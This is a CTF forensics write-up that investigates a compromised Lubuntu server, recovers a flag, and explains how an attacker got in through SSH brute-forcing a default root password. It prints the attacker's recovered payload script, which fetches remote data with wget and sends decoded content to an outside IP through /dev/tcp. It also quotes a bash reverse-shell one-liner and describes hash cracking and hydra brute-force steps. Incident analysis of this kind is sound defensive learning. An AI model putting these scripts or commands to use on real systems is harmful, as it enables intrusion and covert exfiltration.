# Challenge Name: DFIR

![date](https://img.shields.io/badge/date-24.04.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![forensics category](https://img.shields.io/badge/category-Forensics-blueviolet.svg)   
![value](https://img.shields.io/badge/value-400-blue.svg)  


## Description

Our Lubuntu server has been breached! We recieved an alert about it communicating with malicious servers and we saw a SIGNIFICANT increase in CPU usage. We SSHed in and saw that changes had been made to the / directory. We need to know how this attacker got in (so we can keep him out in the future) and what he was using our server for...

uname: "victem" (ya, we kinda jinxed ourselves with that name) pw: "correct-horse-battery-staple"

Download: https://drive.google.com/file/d/16sV8pXSrG22KL4zJ9VrpZTcZAs_N9XYw/view 

## Detailed solution  

Start by importing the virtualbox machine and run it 

![image](https://user-images.githubusercontent.com/72421091/116092049-fde5d280-a694-11eb-93e7-3d1c3011ebac.png)

Let's SSH to the machine using the credentials in description ```victem / correct-horse-battery-staple``` get more confortable 

Our machine is a ```Lubuntu 18.04 LTS``` and the linux kernel version is ```4.15.0-20``` 

![image](https://user-images.githubusercontent.com/72421091/116094116-ca0bac80-a696-11eb-985f-8ee3b03d722e.png)

The description mention that that changes had been made to the / directory so let's go check it 

![image](https://user-images.githubusercontent.com/72421091/116096118-89149780-a698-11eb-9b94-39c013a822ee.png)

The file ```cluster-crack.pot``` is suspicious let's read it  

```
cat cluster-crack.pot

$6$fZ/iAgR.$FHl9m/ibTVBQ3OQ645IiLtrcxSsxdt8pTQHh7knfQ2GhD7Pbu0Dv0evXaGnnMVjV7xe5KlRprL5hWEjE6/Ruj0:toor
```

We can see a decrypted linux hash password which is ```toor``` which is a commun default root password 

The POT file is where john stores passwords that it has already cracked for display with the "--show" command  

So the attacker used john the decrypt the users hash password 

Checking the passwd file we can see the users root and victem 

![image](https://user-images.githubusercontent.com/72421091/116098680-caa64200-a69a-11eb-835c-9be03c5a1c45.png)

Let's switch to ```root``` with the password ```toor``` and check the bash history 

![image](https://user-images.githubusercontent.com/72421091/116099769-d2b2b180-a69b-11eb-9ff3-ac36623743b5.png)  

NB : the line 6 is wrong it's sould be ```wget https://gitlab.com/thehacker1/payload/-/blob/master/.payload.sh```  

![image](https://user-images.githubusercontent.com/72421091/116101630-82d4ea00-a69d-11eb-9d94-b4d6f74c5c25.png)

We can see two attacks, running a payload.sh and cracking the shadow file hashes using john and the wordlist rockyou.txt

The files has been downloaded from a gitlab repository https://gitlab.com/thehacker1/payload/-/tree/master 

![image](https://user-images.githubusercontent.com/72421091/116103519-312d5f00-a69f-11eb-997f-9c19f201bccd.png)

**.payload.sh file **

```bash
#!/bin/bash

W=$((15*60))
K=120

while true
do
	echo "sleeping for $W seconds"
	sleep $W
	rm .encrypted_csv.data
	wget https://gitlab.com/thehacker1/payload/-/raw/master/.encrypted_csv.data
	echo "downloaded file"
	F="./.encrypted_csv.data"
	hexdump -v -e '/1 "%u\n"' $F | while read B; do
		E=$((K^B))
		C=$(printf \\$(printf '%03o' $E))
		echo -n $C >> encrypted.csv
	done
	echo "decrypted newest command"
	S=$(cat encrypted.csv)
	rm encrypted.csv
	S="${S::-1}"
	D=,
	S=$S$D
	array=();
	while [[ $S ]]; do
		array+=( "${S%%"$D"*}" );
		S=${S#*"$D"};
	done;
	declare -a array
	M=${array[0]}
	I=${array[1]}
	P=${array[2]}
	M=${M##WPI}
	echo "routing message to $I:$P"
	echo "$M" > /dev/tcp/$I/$P
done
```

We can see some steps :

- Download the .encrypted_csv.data file from the gitlab repository using wget
- Decrypting the file : convert .encrypted_csv.data to decimal values, xor using K=120, converto to octal values and print the ascii charactere
- encrypted.csv : WPI{open-ports-will-be-abused},185.22.155.51,80r
- Save encrypted.csv as array : M is our flag, I the ip adresse and P the port 
- echo "$M" > /dev/tcp/$I/$P : similar to a bash reverse shell ```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```

A bash script for decryption to get the flag 

```bash
#!/bin/bash

wget https://gitlab.com/thehacker1/payload/-/raw/master/.encrypted_csv.data #Download file from the gitlab repository
echo "[+] Downloaded file"

F="./.encrypted_csv.data"
K=120

hexdump -v -e '/1 "%u\n"' $F | while read B; do   # Convert .encrypted_csv.data values to decimal one byte for each line and start a loop
        E=$((K^B))                                # xor K=120 and the decimal value from .encrypted_csv.data (1 byte line)
        C=$(printf \\$(printf '%03o' $E))         # Convert the xor output to octal and print the ascii character
        echo -n $C >> encrypted.csv
done

echo "[+] Decrypted"

S=$(cat encrypted.csv) # S --> WPI{open-ports-will-be-abused},185.22.155.51,80r
flag="${S:0:30}"
echo "[+] Flag : $flag"
```
![image](https://user-images.githubusercontent.com/72421091/116130198-79a64600-a6ba-11eb-85e8-f0364d87e288.png)


## Flag

```
WPI{open-ports-will-be-abused}
```

## How the attacker get in  

Starting by performing ports scan using nmap 

![image](https://user-images.githubusercontent.com/72421091/116132345-f89c7e00-a6bc-11eb-9a4b-6f2163f959e9.png)

We can see the port 22/TCP runinng the OpenSSH 7.6p1 which is vulnerable to a username enumeration attack https://nvd.nist.gov/vuln/detail/CVE-2018-15473  

I tried user enumeration using this exploit https://www.exploit-db.com/exploits/45233 and the metasploit module auxiliary/scanner/ssh/ssh_enumusers but no success

I tried to bruteforce ssh credentials using hydra with a default credentials list https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt 

![image](https://user-images.githubusercontent.com/72421091/116150292-b5e5a080-a6d2-11eb-9926-f09203bdc253.png)

So we can access the server using SSH as root 

### Fix

- Disable direct root ssh login
- Upgrade OpenSSH to latest version

Some best practices explained by liveoverflow  

https://www.youtube.com/watch?v=fKuqYQdqRIs







